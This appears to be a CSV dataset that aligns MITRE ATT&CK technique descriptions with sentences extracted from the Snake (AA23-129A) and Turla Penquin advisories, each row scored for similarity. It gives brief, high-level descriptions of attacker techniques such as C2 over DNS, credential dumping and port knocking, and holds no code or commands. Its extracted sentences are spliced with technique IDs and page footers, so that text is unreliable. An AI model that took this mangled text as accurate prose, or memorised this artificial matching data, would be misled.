"adversaries may obtain and abuse credentials of a local account as a means of gaining initial access, persistence, privilege escalation, or defense evasion.",adversaries may communicate using the domain name system dns t1071.004 (dns) application layer protocol to avoid detection/network filtering by blending in with existing traffic. page 44 of 48 | product id: aa23-129a tlp:cleartlp:clear international partnership adversaries may stage collected data in a central location or data staged t1074 directory prior to exfiltration.,"adversaries may obtain and abuse credentials of existing valid accounts t1078 accounts as a means of gaining initial access, persistence, privilege escalation, or defense evasion.","adversaries may enumerate files and directories or may search in file and directory t1083 specific locations of a host or network share for certain discovery information within a file system. to disguise the source of malicious traffic, adversaries may chain multi-hop proxy t1090.003 together multiple proxies.",66f55ee03063d294857001f7,4495,0.7681213899003495
adversaries may communicate using application layer protocols associated with electronic mail delivery to avoid detection/network filtering by blending in with existing traffic.,adversaries may log user keystrokes to intercept credentials as keylogging t1056.001 the user types them. adversaries may abuse powershell commands and scripts for powershell t1059.001 execution.,adversaries may communicate using osi application layer application layer protocol t1071 protocols to avoid detection/network filtering by blending in with existing traffic.,adversaries may communicate using application layer protocols web protocols t1071.001 associated with web traffic to avoid detection/network filtering by blending in with existing traffic. adversaries may communicate using application layer protocols mail protocols t1071.003 associated with electronic mail delivery to avoid detection/network filtering by blending in with existing traffic.,66f55ee03063d294857001f7,4490,0.7172140614584777
adversaries may communicate using application layer protocols associated with electronic mail delivery to avoid detection/network filtering by blending in with existing traffic.,adversaries may abuse powershell commands and scripts for powershell t1059.001 execution. adversaries may communicate using osi application layer application layer protocol t1071 protocols to avoid detection/network filtering by blending in with existing traffic.,adversaries may communicate using application layer protocols web protocols t1071.001 associated with web traffic to avoid detection/network filtering by blending in with existing traffic.,adversaries may communicate using application layer protocols mail protocols t1071.003 associated with electronic mail delivery to avoid detection/network filtering by blending in with existing traffic. adversaries may communicate using the domain name system dns t1071.004 (dns) application layer protocol to avoid detection/network filtering by blending in with existing traffic.,66f55ee03063d294857001f7,4491,0.7413327309248555
adversaries may communicate using application layer protocols associated with electronic mail delivery to avoid detection/network filtering by blending in with existing traffic.,adversaries may communicate using osi application layer application layer protocol t1071 protocols to avoid detection/network filtering by blending in with existing traffic. adversaries may communicate using application layer protocols web protocols t1071.001 associated with web traffic to avoid detection/network filtering by blending in with existing traffic.,adversaries may communicate using application layer protocols mail protocols t1071.003 associated with electronic mail delivery to avoid detection/network filtering by blending in with existing traffic.,adversaries may communicate using the domain name system dns t1071.004 (dns) application layer protocol to avoid detection/network filtering by blending in with existing traffic. page 44 of 48 | product id: aa23-129a tlp:cleartlp:clear international partnership adversaries may stage collected data in a central location or data staged t1074 directory prior to exfiltration.,66f55ee03063d294857001f7,4492,0.8966880947296414
adversaries may develop malware and malware components that can be used during targeting.,adversaries may execute their own malicious payloads by side- dll side-loading t1574.002 loading dlls. adversaries may compromise third-party infrastructure that can compromise infrastructure t1584 be used during targeting.,adversaries may develop malware and malware components that malware t1587.001 can be used during targeting.,"page 46 of 48 | product id: aa23-129a tlp:cleartlp:clear international partnership adversaries may buy and/or steal capabilities that can be used obtain capabilities t1588 during targeting. adversaries may upload, install, or otherwise set up capabilities stage capabilities t1608 that can be used during targeting.",66f55ee03063d294857001f7,4522,0.8094011976586835
adversaries may attempt to manipulate features of their artifacts to make them appear legitimate or benign to users and/or security tools.,"adversaries may attempt to make an executable or file difficult to obfuscated files or t1027 discover or analyze by encrypting, encoding, or otherwise information obfuscating its contents on the system or in transit. adversaries may perform software packing or virtual machine software packing t1027.002 software protection to conceal their code.",adversaries may attempt to manipulate features of their artifacts masquerading t1036 to make them appear legitimate or benign to users and/or security tools.,"adversaries may sniff network traffic to capture information about network sniffing t1040 an environment, including authentication material passed over the network. adversaries may attempt to get a listing of services running on network service discovery t1046 remote hosts and local network infrastructure devices, including those that may be vulnerable to remote software exploitation.",66f55ee03063d294857001f7,4484,0.878203913186468
"adversaries may interact with the windows registry to hide configuration information within registry keys, remove information as part of cleaning up, or as part of other techniques to aid in persistence and execution.",adversaries may create multiple stages for command and control multi-stage channels t1104 that are employed under different conditions or for certain functions. adversaries may interact with the native os application native api t1106 programming interface (api) to execute behaviors.,"adversaries may interact with the windows registry to hide configuration information within registry keys, remove modify registry t1112 information as part of cleaning up, or as part of other techniques to aid in persistence and execution.","once established within a system or network, an adversary may automated collection t1119 use automated techniques for collecting internal data. adversaries may encode data to make the content of command data encoding t1132 and control traffic more difficult to detect.",66f55ee03063d294857001f7,4501,0.933816478200685
adversaries may create multiple stages for command and control that are employed under different conditions or for certain functions.,"to disguise the source of malicious traffic, adversaries may chain multi-hop proxy t1090.003 together multiple proxies. adversaries may use an osi non-application layer protocol for non-application layer t1095 communication between host and c2 server or among infected protocol hosts within a network.",adversaries may create multiple stages for command and control multi-stage channels t1104 that are employed under different conditions or for certain functions.,"adversaries may interact with the native os application native api t1106 programming interface (api) to execute behaviors. adversaries may interact with the windows registry to hide configuration information within registry keys, remove modify registry t1112 information as part of cleaning up, or as part of other techniques to aid in persistence and execution.",66f55ee03063d294857001f7,4499,0.8365967386179416
"to disguise the source of malicious traffic, adversaries may chain together multiple proxies.","adversaries may obtain and abuse credentials of existing valid accounts t1078 accounts as a means of gaining initial access, persistence, privilege escalation, or defense evasion. adversaries may enumerate files and directories or may search in file and directory t1083 specific locations of a host or network share for certain discovery information within a file system.","to disguise the source of malicious traffic, adversaries may chain multi-hop proxy t1090.003 together multiple proxies.",adversaries may use an osi non-application layer protocol for non-application layer t1095 communication between host and c2 server or among infected protocol hosts within a network. adversaries may create multiple stages for command and control multi-stage channels t1104 that are employed under different conditions or for certain functions.,66f55ee03063d294857001f7,4497,0.7392795414703097
adversaries may interact with the native os application programming interface  to execute behaviors.,adversaries may use an osi non-application layer protocol for non-application layer t1095 communication between host and c2 server or among infected protocol hosts within a network. adversaries may create multiple stages for command and control multi-stage channels t1104 that are employed under different conditions or for certain functions.,adversaries may interact with the native os application native api t1106 programming interface (api) to execute behaviors.,"adversaries may interact with the windows registry to hide configuration information within registry keys, remove modify registry t1112 information as part of cleaning up, or as part of other techniques to aid in persistence and execution. once established within a system or network, an adversary may automated collection t1119 use automated techniques for collecting internal data.",66f55ee03063d294857001f7,4500,0.7981170508636624
"adversaries may attempt to get a listing of services running on remote hosts, including those that may be vulnerable to remote software exploitation.","adversaries may attempt to manipulate features of their artifacts masquerading t1036 to make them appear legitimate or benign to users and/or security tools. adversaries may sniff network traffic to capture information about network sniffing t1040 an environment, including authentication material passed over the network.","adversaries may attempt to get a listing of services running on network service discovery t1046 remote hosts and local network infrastructure devices, including those that may be vulnerable to remote software exploitation.",adversaries may inject dynamic-link libraries (dlls) into dynamic-link library t1055.001 processes in order to evade process-based defenses as well as injection possibly elevate privileges. adversaries may log user keystrokes to intercept credentials as keylogging t1056.001 the user types them.,66f55ee03063d294857001f7,4486,0.7950134644368245
adversaries may look for folders and drives shared on remote systems as a means of identifying sources of information to gather as a precursor for collection and to identify potential systems of interest for lateral movement.,adversaries may encode data to make the content of command data encoding t1132 and control traffic more difficult to detect. adversaries may encode data with a non-standard data encoding non-standard encoding t1132.002 system to make the content of command and control traffic more difficult to detect.,adversaries may look for folders and drives shared on remote systems as a means of identifying sources of information to network share discovery t1135 gather as a precursor for collection and to identify potential systems of interest for lateral movement.,deobfuscate/decode files adversaries may use obfuscated files or information to hide t1140 or information artifacts of an intrusion from analysis. exploit public-facing adversaries may attempt to exploit a weakness in an internet- t1190 application facing host or system to initially access a network.,66f55ee03063d294857001f7,4505,0.9143507482309509
"adversaries may sniff network traffic to capture information about an environment, including authentication material passed over the network.",adversaries may perform software packing or virtual machine software packing t1027.002 software protection to conceal their code. adversaries may attempt to manipulate features of their artifacts masquerading t1036 to make them appear legitimate or benign to users and/or security tools.,"adversaries may sniff network traffic to capture information about network sniffing t1040 an environment, including authentication material passed over the network.","adversaries may attempt to get a listing of services running on network service discovery t1046 remote hosts and local network infrastructure devices, including those that may be vulnerable to remote software exploitation. adversaries may inject dynamic-link libraries (dlls) into dynamic-link library t1055.001 processes in order to evade process-based defenses as well as injection possibly elevate privileges.",66f55ee03063d294857001f7,4485,0.8753534882009297
adversaries may use a non-application layer protocol for communication between host and c2 server or among infected hosts within a network.,"adversaries may enumerate files and directories or may search in file and directory t1083 specific locations of a host or network share for certain discovery information within a file system. to disguise the source of malicious traffic, adversaries may chain multi-hop proxy t1090.003 together multiple proxies.",adversaries may use an osi non-application layer protocol for non-application layer t1095 communication between host and c2 server or among infected protocol hosts within a network.,adversaries may create multiple stages for command and control multi-stage channels t1104 that are employed under different conditions or for certain functions. adversaries may interact with the native os application native api t1106 programming interface (api) to execute behaviors.,66f55ee03063d294857001f7,4498,0.8561674430936843
adversaries may encode data with a non-standard data encoding system to make the content of command and control traffic more difficult to detect.,"adversaries may interact with the windows registry to hide configuration information within registry keys, remove modify registry t1112 information as part of cleaning up, or as part of other techniques to aid in persistence and execution. once established within a system or network, an adversary may automated collection t1119 use automated techniques for collecting internal data.",adversaries may encode data to make the content of command data encoding t1132 and control traffic more difficult to detect.,adversaries may encode data with a non-standard data encoding non-standard encoding t1132.002 system to make the content of command and control traffic more difficult to detect. adversaries may look for folders and drives shared on remote systems as a means of identifying sources of information to network share discovery t1135 gather as a precursor for collection and to identify potential systems of interest for lateral movement.,66f55ee03063d294857001f7,4503,0.8269319992049962
adversaries may encode data with a non-standard data encoding system to make the content of command and control traffic more difficult to detect.,"once established within a system or network, an adversary may automated collection t1119 use automated techniques for collecting internal data. adversaries may encode data to make the content of command data encoding t1132 and control traffic more difficult to detect.",adversaries may encode data with a non-standard data encoding non-standard encoding t1132.002 system to make the content of command and control traffic more difficult to detect.,adversaries may look for folders and drives shared on remote systems as a means of identifying sources of information to network share discovery t1135 gather as a precursor for collection and to identify potential systems of interest for lateral movement. deobfuscate/decode files adversaries may use obfuscated files or information to hide t1140 or information artifacts of an intrusion from analysis.,66f55ee03063d294857001f7,4504,0.881978330446374
"adversaries may attempt to dump credentials to obtain account login and credential material, normally in the form of a hash or a clear text password, from the operating system and software.",adversaries may obfuscate command and control traffic to make data obfuscation t1001 it more difficult to detect. adversaries may impersonate legitimate protocols or web service protocol impersonation t1001.003 traffic to disguise command and control activity and thwart analysis efforts.,"page 43 of 48 | product id: aa23-129a tlp:cleartlp:clear international partnership adversaries may attempt to dump credentials to obtain account os credential dumping t1003 login and credential material, normally in the form of a hash or a clear text password, from the operating system and software.","adversaries may use rootkits to hide the presence of programs, rootkit t1014 files, network connections, services, drivers, and other system components. adversaries may attempt to make an executable or file difficult to obfuscated files or t1027 discover or analyze by encrypting, encoding, or otherwise information obfuscating its contents on the system or in transit.",66f55ee03063d294857001f7,4480,0.7295699111573988
"adversaries may attempt to make an executable or file difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system or in transit.","page 43 of 48 | product id: aa23-129a tlp:cleartlp:clear international partnership adversaries may attempt to dump credentials to obtain account os credential dumping t1003 login and credential material, normally in the form of a hash or a clear text password, from the operating system and software. adversaries may use rootkits to hide the presence of programs, rootkit t1014 files, network connections, services, drivers, and other system components.","adversaries may attempt to make an executable or file difficult to obfuscated files or t1027 discover or analyze by encrypting, encoding, or otherwise information obfuscating its contents on the system or in transit.",adversaries may perform software packing or virtual machine software packing t1027.002 software protection to conceal their code. adversaries may attempt to manipulate features of their artifacts masquerading t1036 to make them appear legitimate or benign to users and/or security tools.,66f55ee03063d294857001f7,4482,0.9299575614174911
"after the sequence is completed, opening a port is often accomplished by the host based firewall, but could also be implemented by custom software.","to enable a port, an adversary sends a series of packets with certain characteristics before the port will be opened. usually this series of packets consists of attempted connections to a predefined sequence of closed ports, but can involve unusual flags, specific strings or other unique characteristics.","after the sequence is completed, opening a port is often accomplished by the host based firewall, but could also be implemented by custom software.",t1105 remote file files may be copied from one system to another to stage adversary copy tools or other files over the course of an operation. files may be copied from an external adversary-controlled system through the command and control channel to bring tools into the victim network or through alternate protocols with another tool such as ftp.,66f55ed73063d294857001f6,3942,1.0000000000000002
adversaries may abuse powershell commands and scripts for execution.,adversaries may inject dynamic-link libraries (dlls) into dynamic-link library t1055.001 processes in order to evade process-based defenses as well as injection possibly elevate privileges. adversaries may log user keystrokes to intercept credentials as keylogging t1056.001 the user types them.,adversaries may abuse powershell commands and scripts for powershell t1059.001 execution.,adversaries may communicate using osi application layer application layer protocol t1071 protocols to avoid detection/network filtering by blending in with existing traffic. adversaries may communicate using application layer protocols web protocols t1071.001 associated with web traffic to avoid detection/network filtering by blending in with existing traffic.,66f55ee03063d294857001f7,4489,0.7398619257776828
adversaries may impersonate legitimate protocols or web service traffic to disguise command and control activity and thwart analysis efforts.,technique title id use network connection adversaries may perform network connection enumeration to t0840 enumeration discover information about device communication patterns. adversaries may obfuscate command and control traffic to make data obfuscation t1001 it more difficult to detect.,adversaries may impersonate legitimate protocols or web service protocol impersonation t1001.003 traffic to disguise command and control activity and thwart analysis efforts.,"page 43 of 48 | product id: aa23-129a tlp:cleartlp:clear international partnership adversaries may attempt to dump credentials to obtain account os credential dumping t1003 login and credential material, normally in the form of a hash or a clear text password, from the operating system and software. adversaries may use rootkits to hide the presence of programs, rootkit t1014 files, network connections, services, drivers, and other system components.",66f55ee03063d294857001f7,4479,0.8273644920501851
adversaries may tunnel network communications to and from a victim system within a separate protocol to avoid detection/network filtering and/or enable access to otherwise unreachable systems.,adversaries may abuse the windows service control manager to service execution t1569.002 execute malicious commands or payloads. adversaries may transfer tools or other files between systems in lateral tool transfer t1570 a compromised environment.,adversaries may tunnel network communications to and from a victim system within a separate protocol to avoid protocol tunneling t1572 detection/network filtering and/or enable access to otherwise unreachable systems.,adversaries may employ a known encryption algorithm to conceal encrypted channel t1573 command and control traffic rather than relying on any inherent protections provided by a communication protocol. adversaries may employ a known symmetric encryption algorithm symmetric cryptography t1573.001 to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol.,66f55ee03063d294857001f7,4516,0.9070635137661824
"adversaries may use rootkits to hide the presence of programs, files, network connections, services, drivers, and other system components.","adversaries may impersonate legitimate protocols or web service protocol impersonation t1001.003 traffic to disguise command and control activity and thwart analysis efforts. page 43 of 48 | product id: aa23-129a tlp:cleartlp:clear international partnership adversaries may attempt to dump credentials to obtain account os credential dumping t1003 login and credential material, normally in the form of a hash or a clear text password, from the operating system and software.","adversaries may use rootkits to hide the presence of programs, rootkit t1014 files, network connections, services, drivers, and other system components.","adversaries may attempt to make an executable or file difficult to obfuscated files or t1027 discover or analyze by encrypting, encoding, or otherwise information obfuscating its contents on the system or in transit. adversaries may perform software packing or virtual machine software packing t1027.002 software protection to conceal their code.",66f55ee03063d294857001f7,4481,0.8679788927129309
adversaries may abuse the windows service control manager to execute malicious commands or payloads.,an adversary may compress and/or encrypt data that is collected archive collected data t1560.003 prior to exfiltration. adversaries may attempt to hide artifacts associated with their hide artifacts t1564 behaviors to evade detection.,adversaries may abuse the windows service control manager to service execution t1569.002 execute malicious commands or payloads.,adversaries may transfer tools or other files between systems in lateral tool transfer t1570 a compromised environment. adversaries may tunnel network communications to and from a victim system within a separate protocol to avoid protocol tunneling t1572 detection/network filtering and/or enable access to otherwise unreachable systems.,66f55ee03063d294857001f7,4514,0.7775268403506085
adversaries may perform software packing or virtual machine software protection to conceal their code.,"adversaries may use rootkits to hide the presence of programs, rootkit t1014 files, network connections, services, drivers, and other system components. adversaries may attempt to make an executable or file difficult to obfuscated files or t1027 discover or analyze by encrypting, encoding, or otherwise information obfuscating its contents on the system or in transit.",adversaries may perform software packing or virtual machine software packing t1027.002 software protection to conceal their code.,"adversaries may attempt to manipulate features of their artifacts masquerading t1036 to make them appear legitimate or benign to users and/or security tools. adversaries may sniff network traffic to capture information about network sniffing t1040 an environment, including authentication material passed over the network.",66f55ee03063d294857001f7,4483,0.8747058366996231
"adversaries may upload, install, or otherwise set up capabilities that can be used during targeting.",adversaries may develop malware and malware components that malware t1587.001 can be used during targeting. page 46 of 48 | product id: aa23-129a tlp:cleartlp:clear international partnership adversaries may buy and/or steal capabilities that can be used obtain capabilities t1588 during targeting.,"adversaries may upload, install, or otherwise set up capabilities stage capabilities t1608 that can be used during targeting.",adversaries may deploy a container into an environment to deploy container t1610 facilitate execution or evade defenses. volatility plugin the following plugin for the volatility memory analysis framework will scan all processes on the system until it finds the snake user mode component injected into a process.,66f55ee03063d294857001f7,4524,0.8471943955017682
adversaries may encode data with a standard data encoding system to make the content of command and control traffic more difficult to detect.,"adversaries may interact with the windows registry to hide configuration information within registry keys, remove modify registry t1112 information as part of cleaning up, or as part of other techniques to aid in persistence and execution. once established within a system or network, an adversary may automated collection t1119 use automated techniques for collecting internal data.",adversaries may encode data to make the content of command data encoding t1132 and control traffic more difficult to detect.,adversaries may encode data with a non-standard data encoding non-standard encoding t1132.002 system to make the content of command and control traffic more difficult to detect. adversaries may look for folders and drives shared on remote systems as a means of identifying sources of information to network share discovery t1135 gather as a precursor for collection and to identify potential systems of interest for lateral movement.,66f55ee03063d294857001f7,4503,0.8629106404467736
adversaries may encode data with a standard data encoding system to make the content of command and control traffic more difficult to detect.,"once established within a system or network, an adversary may automated collection t1119 use automated techniques for collecting internal data. adversaries may encode data to make the content of command data encoding t1132 and control traffic more difficult to detect.",adversaries may encode data with a non-standard data encoding non-standard encoding t1132.002 system to make the content of command and control traffic more difficult to detect.,adversaries may look for folders and drives shared on remote systems as a means of identifying sources of information to network share discovery t1135 gather as a precursor for collection and to identify potential systems of interest for lateral movement. deobfuscate/decode files adversaries may use obfuscated files or information to hide t1140 or information artifacts of an intrusion from analysis.,66f55ee03063d294857001f7,4504,0.798827857962277
adversaries may employ a known symmetric encryption algorithm to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol.,adversaries may transfer tools or other files between systems in lateral tool transfer t1570 a compromised environment. adversaries may tunnel network communications to and from a victim system within a separate protocol to avoid protocol tunneling t1572 detection/network filtering and/or enable access to otherwise unreachable systems.,adversaries may employ a known encryption algorithm to conceal encrypted channel t1573 command and control traffic rather than relying on any inherent protections provided by a communication protocol.,adversaries may employ a known symmetric encryption algorithm symmetric cryptography t1573.001 to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol. adversaries may employ a known asymmetric encryption algorithm to conceal command and control traffic rather than asymmetric cryptography t1573.002 relying on any inherent protections provided by a communication protocol.,66f55ee03063d294857001f7,4517,0.8809756362695547
adversaries may employ a known symmetric encryption algorithm to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol.,adversaries may tunnel network communications to and from a victim system within a separate protocol to avoid protocol tunneling t1572 detection/network filtering and/or enable access to otherwise unreachable systems. adversaries may employ a known encryption algorithm to conceal encrypted channel t1573 command and control traffic rather than relying on any inherent protections provided by a communication protocol.,adversaries may employ a known symmetric encryption algorithm symmetric cryptography t1573.001 to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol.,adversaries may employ a known asymmetric encryption algorithm to conceal command and control traffic rather than asymmetric cryptography t1573.002 relying on any inherent protections provided by a communication protocol. adversaries may execute their own malicious payloads by side- dll side-loading t1574.002 loading dlls.,66f55ee03063d294857001f7,4518,0.8820608550661395
adversaries may employ a known symmetric encryption algorithm to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol.,adversaries may employ a known encryption algorithm to conceal encrypted channel t1573 command and control traffic rather than relying on any inherent protections provided by a communication protocol. adversaries may employ a known symmetric encryption algorithm symmetric cryptography t1573.001 to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol.,adversaries may employ a known asymmetric encryption algorithm to conceal command and control traffic rather than asymmetric cryptography t1573.002 relying on any inherent protections provided by a communication protocol.,adversaries may execute their own malicious payloads by side- dll side-loading t1574.002 loading dlls. adversaries may compromise third-party infrastructure that can compromise infrastructure t1584 be used during targeting.,66f55ee03063d294857001f7,4519,0.7468492357417731
this may take the form of sending a series of packets with certain characteristics before a port will be opened that the adversary can use for command and control.,scheduled task). t1205 port knocking port knocking is a well-established method used by both defenders and adversaries to hide open ports from access.,"to enable a port, an adversary sends a series of packets with certain characteristics before the port will be opened.","usually this series of packets consists of attempted connections to a predefined sequence of closed ports, but can involve unusual flags, specific strings or other unique characteristics. after the sequence is completed, opening a port is often accomplished by the host based firewall, but could also be implemented by custom software.",66f55ed73063d294857001f6,3940,0.7014716099846838
"usually this series of packets consists of attempted connections to a predefined sequence of closed ports  port knocking, but can involve unusual flags, specific strings, or other unique characteristics.","t1205 port knocking port knocking is a well-established method used by both defenders and adversaries to hide open ports from access. to enable a port, an adversary sends a series of packets with certain characteristics before the port will be opened.","usually this series of packets consists of attempted connections to a predefined sequence of closed ports, but can involve unusual flags, specific strings or other unique characteristics.","after the sequence is completed, opening a port is often accomplished by the host based firewall, but could also be implemented by custom software. t1105 remote file files may be copied from one system to another to stage adversary copy tools or other files over the course of an operation.",66f55ed73063d294857001f6,3941,0.9495144920920063
"after the sequence is completed, opening a port may be accomplished by the host-based firewall, but could also be implemented by custom software.","to enable a port, an adversary sends a series of packets with certain characteristics before the port will be opened. usually this series of packets consists of attempted connections to a predefined sequence of closed ports, but can involve unusual flags, specific strings or other unique characteristics.","after the sequence is completed, opening a port is often accomplished by the host based firewall, but could also be implemented by custom software.",t1105 remote file files may be copied from one system to another to stage adversary copy tools or other files over the course of an operation. files may be copied from an external adversary-controlled system through the command and control channel to bring tools into the victim network or through alternate protocols with another tool such as ftp.,66f55ed73063d294857001f6,3942,0.9510082372618112
"adversaries may obtain and abuse credentials of existing accounts as a means of gaining initial access, persistence, privilege escalation, or defense evasion.",adversaries may communicate using the domain name system dns t1071.004 (dns) application layer protocol to avoid detection/network filtering by blending in with existing traffic. page 44 of 48 | product id: aa23-129a tlp:cleartlp:clear international partnership adversaries may stage collected data in a central location or data staged t1074 directory prior to exfiltration.,"adversaries may obtain and abuse credentials of existing valid accounts t1078 accounts as a means of gaining initial access, persistence, privilege escalation, or defense evasion.","adversaries may enumerate files and directories or may search in file and directory t1083 specific locations of a host or network share for certain discovery information within a file system. to disguise the source of malicious traffic, adversaries may chain multi-hop proxy t1090.003 together multiple proxies.",66f55ee03063d294857001f7,4495,0.8929029503875364
adversaries may communicate using application layer protocols associated with web traffic to avoid detection/network filtering by blending in with existing traffic.,adversaries may log user keystrokes to intercept credentials as keylogging t1056.001 the user types them. adversaries may abuse powershell commands and scripts for powershell t1059.001 execution.,adversaries may communicate using osi application layer application layer protocol t1071 protocols to avoid detection/network filtering by blending in with existing traffic.,adversaries may communicate using application layer protocols web protocols t1071.001 associated with web traffic to avoid detection/network filtering by blending in with existing traffic. adversaries may communicate using application layer protocols mail protocols t1071.003 associated with electronic mail delivery to avoid detection/network filtering by blending in with existing traffic.,66f55ee03063d294857001f7,4490,0.7783457342339757
adversaries may communicate using application layer protocols associated with web traffic to avoid detection/network filtering by blending in with existing traffic.,adversaries may abuse powershell commands and scripts for powershell t1059.001 execution. adversaries may communicate using osi application layer application layer protocol t1071 protocols to avoid detection/network filtering by blending in with existing traffic.,adversaries may communicate using application layer protocols web protocols t1071.001 associated with web traffic to avoid detection/network filtering by blending in with existing traffic.,adversaries may communicate using application layer protocols mail protocols t1071.003 associated with electronic mail delivery to avoid detection/network filtering by blending in with existing traffic. adversaries may communicate using the domain name system dns t1071.004 (dns) application layer protocol to avoid detection/network filtering by blending in with existing traffic.,66f55ee03063d294857001f7,4491,0.8941816533246079
adversaries may communicate using application layer protocols associated with web traffic to avoid detection/network filtering by blending in with existing traffic.,adversaries may communicate using osi application layer application layer protocol t1071 protocols to avoid detection/network filtering by blending in with existing traffic. adversaries may communicate using application layer protocols web protocols t1071.001 associated with web traffic to avoid detection/network filtering by blending in with existing traffic.,adversaries may communicate using application layer protocols mail protocols t1071.003 associated with electronic mail delivery to avoid detection/network filtering by blending in with existing traffic.,adversaries may communicate using the domain name system dns t1071.004 (dns) application layer protocol to avoid detection/network filtering by blending in with existing traffic. page 44 of 48 | product id: aa23-129a tlp:cleartlp:clear international partnership adversaries may stage collected data in a central location or data staged t1074 directory prior to exfiltration.,66f55ee03063d294857001f7,4492,0.7321792861267407
an adversary may compress and/or encrypt data that is collected prior to exfiltration.,adversaries may execute their own malicious payloads by dynamic linker hijacking t1547.006 hijacking environment variables the dynamic linker uses to load shared libraries. inter-process adversaries may abuse inter-process communication (ipc) t1559 communication mechanisms for local code or command execution.,an adversary may compress and/or encrypt data that is collected archive collected data t1560.003 prior to exfiltration.,adversaries may attempt to hide artifacts associated with their hide artifacts t1564 behaviors to evade detection. adversaries may abuse the windows service control manager to service execution t1569.002 execute malicious commands or payloads.,66f55ee03063d294857001f7,4512,0.7722665738621782
"once established within a system or network, an adversary may use automated techniques for collecting internal data.","adversaries may interact with the native os application native api t1106 programming interface (api) to execute behaviors. adversaries may interact with the windows registry to hide configuration information within registry keys, remove modify registry t1112 information as part of cleaning up, or as part of other techniques to aid in persistence and execution.","once established within a system or network, an adversary may automated collection t1119 use automated techniques for collecting internal data.",adversaries may encode data to make the content of command data encoding t1132 and control traffic more difficult to detect. adversaries may encode data with a non-standard data encoding non-standard encoding t1132.002 system to make the content of command and control traffic more difficult to detect.,66f55ee03063d294857001f7,4502,0.8575362542264331
adversaries may encode data to make the content of command and control traffic more difficult to detect.,"adversaries may interact with the windows registry to hide configuration information within registry keys, remove modify registry t1112 information as part of cleaning up, or as part of other techniques to aid in persistence and execution. once established within a system or network, an adversary may automated collection t1119 use automated techniques for collecting internal data.",adversaries may encode data to make the content of command data encoding t1132 and control traffic more difficult to detect.,adversaries may encode data with a non-standard data encoding non-standard encoding t1132.002 system to make the content of command and control traffic more difficult to detect. adversaries may look for folders and drives shared on remote systems as a means of identifying sources of information to network share discovery t1135 gather as a precursor for collection and to identify potential systems of interest for lateral movement.,66f55ee03063d294857001f7,4503,0.8632425475526138
"despite the use of a secure algorithm, these implementations may be vulnerable to reverse engineering if secret keys are encoded and/or generated within malware samples/configuration files.","a simple scheme, such as protocol xor-ing the plaintext with a fixed key, will produce a very weak ciphertext. © copyright leonardo s.p.a. – all rights reserved 23 company general usemalware technical insight: turla “penquin_x64” t1032 standard adversaries may explicitly employ a known encryption algorithm to cryptographic conceal command and control traffic rather than relying on any protocol inherent protections provided by a communication protocol.","despite the use of a secure algorithm, these implementations may be vulnerable to reverse engineering if necessary secret keys are encoded and/or generated within malware samples/configuration files.","t1158 hidden files to prevent normal users from accidentally changing special files on and directories a system, most operating systems have the concept of a ‘hidden’ file. these files don’t show up when a user browses the file system with a gui or when using normal commands on the command line.",66f55ed73063d294857001f6,3951,0.9618427515840351
adversaries may enumerate files and directories or may search in specific locations of a host or network share for certain information within a file system.,"page 44 of 48 | product id: aa23-129a tlp:cleartlp:clear international partnership adversaries may stage collected data in a central location or data staged t1074 directory prior to exfiltration. adversaries may obtain and abuse credentials of existing valid accounts t1078 accounts as a means of gaining initial access, persistence, privilege escalation, or defense evasion.",adversaries may enumerate files and directories or may search in file and directory t1083 specific locations of a host or network share for certain discovery information within a file system.,"to disguise the source of malicious traffic, adversaries may chain multi-hop proxy t1090.003 together multiple proxies. adversaries may use an osi non-application layer protocol for non-application layer t1095 communication between host and c2 server or among infected protocol hosts within a network.",66f55ee03063d294857001f7,4496,0.8637171882937437
"to prevent normal users from accidentally changing special files on a system, most operating systems have the concept of a ‘hidden’ file.","© copyright leonardo s.p.a. – all rights reserved 23 company general usemalware technical insight: turla “penquin_x64” t1032 standard adversaries may explicitly employ a known encryption algorithm to cryptographic conceal command and control traffic rather than relying on any protocol inherent protections provided by a communication protocol. despite the use of a secure algorithm, these implementations may be vulnerable to reverse engineering if necessary secret keys are encoded and/or generated within malware samples/configuration files.","t1158 hidden files to prevent normal users from accidentally changing special files on and directories a system, most operating systems have the concept of a ‘hidden’ file.",these files don’t show up when a user browses the file system with a gui or when using normal commands on the command line. users must explicitly ask to show the hidden files either via a series of graphical user interface (gui) prompts or with command line switches (dir /a for windows and ls –a for linux and macos).,66f55ed73063d294857001f6,3952,0.8910759903022774
users must explicitly ask to show the hidden files either via a series of graphical user interface  prompts or with command line switches .,"t1158 hidden files to prevent normal users from accidentally changing special files on and directories a system, most operating systems have the concept of a ‘hidden’ file. these files don’t show up when a user browses the file system with a gui or when using normal commands on the command line.",users must explicitly ask to show the hidden files either via a series of graphical user interface (gui) prompts or with command line switches (dir /a for windows and ls –a for linux and macos).,"t1222 file and file and directory permissions are commonly managed by directory discretionary access control lists (dacls) specified by the file or permissions directory owner. file and directory dacl implementations may vary modification by platform, but generally explicitly designate which users/groups can perform which actions (ex: read, write, execute, etc.).",66f55ed73063d294857001f6,3954,0.8375103190039458
adversaries may attempt to hide artifacts associated with their behaviors to evade detection.,inter-process adversaries may abuse inter-process communication (ipc) t1559 communication mechanisms for local code or command execution. an adversary may compress and/or encrypt data that is collected archive collected data t1560.003 prior to exfiltration.,adversaries may attempt to hide artifacts associated with their hide artifacts t1564 behaviors to evade detection.,adversaries may abuse the windows service control manager to service execution t1569.002 execute malicious commands or payloads. adversaries may transfer tools or other files between systems in lateral tool transfer t1570 a compromised environment.,66f55ee03063d294857001f7,4513,0.875999800224953
"adversaries may obtain and abuse credentials of a local account as a means of gaining initial access, persistence, privilege escalation, or defense evasion.",adversaries may communicate using the domain name system dns t1071.004 (dns) application layer protocol to avoid detection/network filtering by blending in with existing traffic. page 44 of 48 | product id: aa23-129a tlp:cleartlp:clear international partnership adversaries may stage collected data in a central location or data staged t1074 directory prior to exfiltration.,"adversaries may obtain and abuse credentials of existing valid accounts t1078 accounts as a means of gaining initial access, persistence, privilege escalation, or defense evasion.","adversaries may enumerate files and directories or may search in file and directory t1083 specific locations of a host or network share for certain discovery information within a file system. to disguise the source of malicious traffic, adversaries may chain multi-hop proxy t1090.003 together multiple proxies.",66f55ee03063d294857001f7,4495,0.7681213899003495
